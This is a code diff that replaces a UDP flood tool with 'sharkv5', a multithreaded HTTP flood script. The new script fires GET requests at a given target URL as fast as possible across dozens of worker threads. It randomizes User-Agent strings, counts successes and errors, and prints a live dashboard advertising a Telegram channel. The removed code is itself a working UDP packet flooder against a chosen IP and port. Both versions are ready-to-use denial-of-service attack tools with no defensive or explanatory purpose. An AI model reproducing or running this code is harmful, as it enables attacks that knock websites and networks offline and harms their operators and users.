@@ -1,118 +1,131 @@
-const dgram = require('dgram');
-const cluster = require('cluster');
-const os = require('os');
+const http = require('http');
+const { Worker, isMainThread, workerData } = require('worker_threads');
+const readline = require('readline');
+const net = require('net');
 
-const target = process.argv[2];
-const port = parseInt(process.argv[3]) || 53;
-const duration = parseInt(process.argv[4]);
+const TAGS = ['S.T.S', 'T.S.P', 'SL S.T.S TERROR'];
+const THREADS_MIN = 15;
+const THREADS_MAX = 35;
+const MAX_CONN_PER_THREAD = 25; // lowered to reduce overload
+const LIVE_REFRESH_RATE = 100;
 
-if (!target || isNaN(duration)) {
-  console.log('Usage: node udp-panzerfaust-heavy.js <target_ip> <port> <duration_seconds>');
-  process.exit(1);
+let totalRequests = 0;
+let successCount = 0;
+let errorCount = 0;
+let rpsLastSecond = 0;
+let maxRps = 0;
+let end = 0;
+
+function getRandomInt(min, max) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-// ========== CONFIG ==========
-const payloadSize = 1472; // Max UDP payload (Ethernet MTU)
-const cpuCount = os.cpus().length;
-const payload = Buffer.alloc(payloadSize); // fast empty buffer
+function randomUA() {
+  const tag = TAGS[Math.floor(Math.random() * TAGS.length)];
+  return `Mozilla/5.0 (SHARK/${Math.random().toFixed(5)}) ${tag}`;
+}
 
-const endTime = Date.now() + duration * 1000;
-
-// ========== FORMATTING ==========
-function formatNumber(n) {
-  const units = ['', 'K', 'M', 'B', 'T'];
-  let i = 0;
-  while (n >= 1000 && i < units.length - 1) {
-    n /= 1000;
-    i++;
+if (isMainThread) {
+  if (process.argv.length < 4) {
+    console.error("Usage: node sharkv5.js <target> <duration_sec>");
+    process.exit(1);
   }
-  return `${n.toFixed(2)}${units[i]}`;
-}
 
-function formatBytes(bytes) {
-  const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
-  let i = 0;
-  while (bytes >= 1024 && i < units.length - 1) {
-    bytes /= 1024;
-    i++;
+  const target = process.argv[2];
+  const duration = parseInt(process.argv[3]);
+  end = Date.now() + duration * 1000;
+
+  let activeThreads = getRandomInt(THREADS_MIN, THREADS_MAX);
+  for (let i = 0; i < activeThreads; i++) {
+    new Worker(__filename, { workerData: { target, duration } });
   }
-  return `${bytes.toFixed(2)} ${units[i]}`;
-}
 
-// ========== MASTER ==========
-if (cluster.isMaster) {
-  let totalSent = 0;
-  let totalBytes = 0;
+  // Dynamic thread count update every 20s
+  setInterval(() => {
+    activeThreads = getRandomInt(THREADS_MIN, THREADS_MAX);
+    maxRps = Math.max(maxRps, rpsLastSecond);
+    rpsLastSecond = 0;
+  }, 20000);
 
-  console.clear();
-  console.log('UDP-PANZERFAUST [HEAVY]');
-  console.log('--------------------------------------');
-  console.log(`Target:                ${target}:${port}`);
-  console.log(`Duration:              ${duration}s`);
-  console.log(`Payload:               ${payloadSize} bytes`);
-  console.log(`Cores:                 ${cpuCount}`);
-  console.log('Launching...\n');
+  setInterval(() => {
+    renderStats();
+  }, LIVE_REFRESH_RATE);
 
-  for (let i = 0; i < cpuCount; i++) cluster.fork();
+  function renderStats() {
+    const remaining = Math.max(0, end - Date.now());
+    const mins = Math.floor(remaining / 60000);
+    const secs = Math.floor((remaining % 60000) / 1000);
 
-  for (const id in cluster.workers) {
-    cluster.workers[id].on('message', (msg) => {
-      if (msg.type === 'stats') {
-        totalSent += msg.sent;
-        totalBytes += msg.bytes;
+    readline.cursorTo(process.stdout, 0, 0);
+    readline.clearScreenDown(process.stdout);
+    console.log(`SHARKV5 - T.ME/STSVKINGDOM`);
+    console.log(`==============================`);
+    console.log(`total: ${successCount + errorCount}`);
+    console.log(`max-r: ${maxRps}`);
+    console.log(`==============================`);
+    console.log(`succes: ${successCount}`);
+    console.log(`vape: ${errorCount}`);
+    console.log(`==============================`);
+    console.log(`REMAINING: ${mins}:${secs < 10 ? '0' : ''}${secs}`);
+  }
+
+  // Stats IPC server
+  const server = net.createServer(socket => {
+    socket.on('data', data => {
+      const msg = data.toString();
+      if (msg === 'ok') {
+        successCount++;
+        rpsLastSecond++;
+      } else if (msg === 'err') {
+        errorCount++;
       }
     });
-  }
-
-  setInterval(() => {
-    console.clear();
-    console.log('UDP-PANZERFAUST [HEAVY]');
-    console.log('--------------------------------------');
-    console.log(`Total Packets Sent:    ${formatNumber(totalSent)}`);
-    console.log(`Data Sent:             ${formatBytes(totalBytes)}`);
-    console.log(`Target:                ${target}:${port}`);
-    console.log(`Payload:               ${payloadSize} bytes`);
-    console.log('--------------------------------------');
-  }, 5000);
-
-  setTimeout(() => {
-    console.log('\nAttack complete.');
-    for (const id in cluster.workers) cluster.workers[id].kill();
-    process.exit(0);
-  }, duration * 1000);
-
-// ========== WORKER ==========
-} else {
-  const sock = dgram.createSocket('udp4');
-
-  sock.bind(() => {
-    sock.setSendBufferSize(4 * 1024 * 1024); // 4MB socket buffer
   });
+  server.listen(9999);
 
-  let sent = 0;
-  let bytes = 0;
+} else {
+  const { target, duration } = workerData;
+  const endTime = Date.now() + duration * 1000;
+  const socket = net.connect(9999, '127.0.0.1');
+  const sendStat = msg => socket.write(msg);
+
+  // Agent reused to avoid overhead
+  const agent = new http.Agent({ keepAlive: true, maxSockets: 10 });
 
   function flood() {
-    function loop() {
-      if (Date.now() > endTime) return;
+    if (Date.now() > endTime) return;
 
-      for (let i = 0; i < 100; i++) {
-        sock.send(payload, port, target);
-        sent++;
-        bytes += payloadSize;
+    const options = {
+      agent,
+      method: 'GET',
+      headers: {
+        'User-Agent': randomUA(),
+        'Accept': '*/*',
+        'Connection': 'keep-alive',
+        'Pragma': 'no-cache',
+        'Cache-Control': 'no-cache'
       }
+    };
 
-      setImmediate(loop);
+    try {
+      const req = http.request(target, options, res => {
+        // Consume data to avoid memory leak
+        res.on('data', () => {});
+        res.on('end', () => sendStat('ok'));
+      });
+
+      req.on('error', () => sendStat('err'));
+      req.end();
+    } catch {
+      sendStat('err');
     }
 
-    loop();
+    // Flood as fast as possible, but with small delay to prevent overload
+    setTimeout(flood, 0);
   }
 
-  setInterval(() => {
-    process.send({ type: 'stats', sent, bytes });
-    sent = 0;
-    bytes = 0;
-  }, 1000);
-
-  flood();
+  // Start limited concurrent requests per thread
+  for (let i = 0; i < MAX_CONN_PER_THREAD; i++) {
+    flood();
+  }
 }
